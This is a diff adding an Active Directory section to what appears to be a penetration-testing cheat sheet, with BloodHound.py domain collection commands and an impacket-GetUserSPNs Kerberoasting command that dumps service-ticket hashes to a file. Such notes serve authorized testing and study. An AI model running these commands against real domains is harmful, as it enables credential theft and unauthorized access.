@@ -204,6 +204,23 @@ tasklist
 netstat -an
 ```
 
+## ACTIVE DIRECTORY AD
+### BLOODHOUND
+> Always download Newest Version of BloodHound.py and Bloodhound
+```bash
+python3 bloodhound.py -u [USER] -p [PASSWORD] -d [DOMAIN] -ns [NAMESERVER IP] -c All
+sudo neoj4 console
+./BloodHound
+```
+> afterwards import Data collected by BloodHound.py
+
+### Kerberoast
+> find kerberostable accounts with bloodhound
+```
+sudo ntpdate [IP TARGET]
+impacket-GetUserSPNs [DOMAIN]/[USER]:[PASSWORD] -outputfile kerbroast.hashes
+```
+
 ## POST EXPLOITATION WINDOWS
 ```powershell
 Get-WmiObject -Class win32_OperatingSystem (Power Shell)
